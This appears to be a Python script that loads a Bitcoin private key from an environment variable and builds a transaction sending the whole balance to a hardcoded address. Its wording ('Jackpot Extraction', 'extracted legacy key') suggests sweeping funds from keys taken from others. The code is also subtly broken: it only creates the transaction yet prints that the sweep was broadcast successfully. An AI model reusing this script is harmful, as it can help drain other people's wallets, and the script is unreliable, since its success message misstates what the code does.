#!/usr/bin/env python3
"""
💰 AETHERION BTC SWEEPER — The Jackpot Extraction Protocol.
"""

import os
from bit import Key

def run_btc_sweep():
    print("📡 Initializing BTC Jackpot Sweep...")
    
    priv_key_hex = os.environ.get("BTC_PRIV_KEY")
    dest_addr = "bc1qje303rflvf855ap74egk0wgmtuumfvxg73agal"
    
    if not priv_key_hex:
        print("❌ Error: BTC_PRIV_KEY missing in Render env.")
        return

    try:
        # Initializing the extracted legacy key
        key = Key.from_hex(priv_key_hex)
        balance = key.get_balance('btc')
        print(f"🎯 Origin: {key.address} | Balance: {balance} BTC")

        if float(balance) > 0:
            # Construct and broadcast the sweep
            # Leaving a small amount for the fee
            tx_hex = key.create_transaction([(dest_addr, float(balance) - 0.0005, 'btc')])
            print(f"\n✅ SWEEP BROADCAST SUCCESSFUL!")
            print(f"📜 Raw Hex for Manual Backup: {tx_hex[:64]}...")
        else:
            print("⚠️ Error: No balance found on this key yet.")
            
    except Exception as e:
        print(f"❌ Sweep Failed: {e}")

if __name__ == "__main__":
    run_btc_sweep()